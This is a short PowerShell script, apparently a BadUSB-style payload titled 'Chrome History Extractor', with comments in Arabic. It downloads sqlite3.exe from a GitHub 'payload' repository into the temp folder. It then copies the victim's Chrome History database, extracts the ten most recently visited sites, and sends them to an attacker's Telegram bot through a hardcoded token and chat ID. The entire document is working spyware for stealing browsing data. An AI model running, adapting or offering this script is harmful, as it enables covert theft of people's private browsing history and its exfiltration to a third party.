# En9mm - Chrome History Extractor with SQLite + Telegram

$Token  = "7921423137:AAHj4kDraZc0BRPk6c6j7TC2vJE5Dy-6j0g"
$ChatID = "774651165"
$Msg    = "🧠 *Chrome Last 10 Visited Sites:*\n"

# إعداد مسار ملف SQLite
$sqliteURL = "https://github.com/En9mm/payload/raw/main/sqlite3.exe"
$sqlitePath = "$env:TEMP\sqlite3.exe"

# تحميل SQLite إذا لم يكن موجودًا
if (-not (Test-Path $sqlitePath)) {
    Invoke-WebRequest -Uri $sqliteURL -OutFile $sqlitePath
}

# نسخ قاعدة بيانات Chrome
$chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$tempHistory   = "$env:TEMP\History_copy.db"
if (Test-Path $chromeHistory) {
    Copy-Item $chromeHistory $tempHistory -Force

    # تنفيذ استعلام SQLite
    $query = "SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch') as visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10;"
    $results = & $sqlitePath $tempHistory $query

    if ($results) {
        $Msg += "`````n$results`n````"
    } else {
        $Msg += "`n❌ *No data found in Chrome history.*"
    }
} else {
    $Msg += "`n⚠️ *Chrome history not found.*"
}

# إرسال التقرير إلى Telegram
$uri = "https://api.telegram.org/bot$Token/sendMessage"
Invoke-RestMethod -Uri $uri -Method POST -ContentType "application/json" -Body (@{
    chat_id = $ChatID
    text = $Msg
    parse_mode = "Markdown"
} | ConvertTo-Json -Depth 3)
